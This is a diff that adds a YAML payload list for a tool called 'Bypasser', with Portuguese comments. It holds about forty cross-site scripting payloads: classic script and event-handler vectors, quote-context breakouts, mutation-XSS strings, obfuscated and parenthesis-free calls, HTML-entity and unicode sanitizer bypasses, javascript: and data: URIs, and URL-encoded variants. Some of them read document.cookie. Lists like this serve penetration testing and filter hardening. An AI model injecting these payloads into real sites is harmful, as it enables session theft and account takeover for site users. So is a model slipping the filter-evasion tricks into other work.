@@ -1,0 +1,55 @@
+# Bypasser - payloads XSS (refletido/DOM, vetores modernos e bypass de filtros)
+payloads:
+  # --- classicos ---
+  - "<script>alert(1)</script>"
+  - "<script>alert(document.cookie)</script>"
+  - "<img src=x onerror=alert(1)>"
+  - "<svg/onload=alert(1)>"
+  - "<body onload=alert(1)>"
+  - "<input autofocus onfocus=alert(1)>"
+  - "<details open ontoggle=alert(1)>"
+  - "<video src=x onerror=alert(1)>"
+  - "<iframe src=javascript:alert(1)>"
+  - "<a href=javascript:alert(1)>click</a>"
+  - "<svg><g/onload=alert(1)//"
+
+  # --- quebra de contexto (aspas) ---
+  - "\"><svg/onload=alert(document.cookie)>"
+  - "'> <svg/onload=alert(1)>"
+  - "`-alert(1)-`"
+
+  # --- mutacao / mXSS ---
+  - "<scr<script>ipt>alert(1)</scr</script>ipt>"
+  - "<svg><script>alert(1)</script></svg>"
+  - "<math><mtext><table><mglyph><style><!--</style><img title='--><img src=1 onerror=alert(1)>"
+  - "[[$[alert(1)]]]"
+  - "<svg/onload=alert(1) onload=alert(2)>"
+
+  # --- sem parenteses / sem aspas / ofuscacao JS ---
+  - "<svg/onload=alert`1`>"
+  - "<svg/onload=alert&lpar;1&rpar;>"
+  - "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"
+  - "<svg/onload=top['al'%2b'ert'](1)>"
+  - "<img src=x onerror=globalThis['al'%2b'ert'](1)>"
+
+  # --- bypass de sanitizadores (entidades e unicode) ---
+  - "<img src=x onerror=alert&#x28;1&#x29;>"
+  - "<img src=x onerror=alert&#40;1&#41;>"
+  - "<svg onload=alert&#40;1&#41;>"
+  - "<img src=x onerror=java&#x73;cript:alert(1)>"
+  - "<svg><script>alert&#x28;1&#x29;</script>"
+  - "<img src=x onerror=\u0061lert(1)>"
+  - "<svg/onload=\u0061lert(1)>"
+
+  # --- DOM sinks / protocolos ---
+  - "javascript:alert(1)"
+  - "data:text/html,<script>alert(1)</script>"
+  - "';alert(1);//"
+  - "\";alert(1);//"
+  - "-alert(1)-"
+
+  # --- encoding URL (1x e 2x) ---
+  - "%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+  - "%253Cscript%253Ealert(1)%253C%253Fscript%253E"
+  - "<script%0a>alert(1)</script>"
+  - "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
